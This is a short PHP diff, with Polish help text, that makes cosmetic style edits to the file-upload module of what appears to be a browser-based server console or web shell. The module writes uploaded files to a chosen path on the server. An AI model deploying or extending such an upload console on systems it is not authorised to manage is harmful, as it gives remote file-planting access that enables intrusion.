@@ -51,7 +51,7 @@ class ModuleUpload extends ModuleAbstract
     public static function getHelp()
     {
         return <<<DATA
-upload - Wrzucanie pliku na serwer. Jeśli nie podano ścieżki to plik zostanie wrzucony do katalogu, w którym się znajdujemy
+upload - Wrzucanie pliku na serwer. Jeśli nie podano ścieżki, to plik zostanie wrzucony do obecnego katalogu
 
     Użycie:
         upload
@@ -67,7 +67,7 @@ DATA;
      */
     public function get()
     {
-        if (($aFileData = Request::getFiles('file')) !== FALSE) {
+        if (($aFileData = Request::getFiles('file')) !== false) {
             $sUploadLocation = getcwd() . '/';
 
             if ($this->oArgs->getNumberOfParams() === 0) {
@@ -82,7 +82,8 @@ DATA;
             );
         }
 
-        return sprintf('<form action="%s" method="post" enctype="multipart/form-data">' .
+        return sprintf(
+            '<form action="%s" method="post" enctype="multipart/form-data">' .
             '<pre id="console"><h1>Wrzuć plik</h1><input type="file" name="file"/></pre>' .
             '<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
             '<input type="submit" name="submit" value="Wrzuć" id="cmd-send"/></form>',
@@ -90,5 +91,4 @@ DATA;
             htmlspecialchars(Request::getPost('cmd'))
         );
     }
-
 }
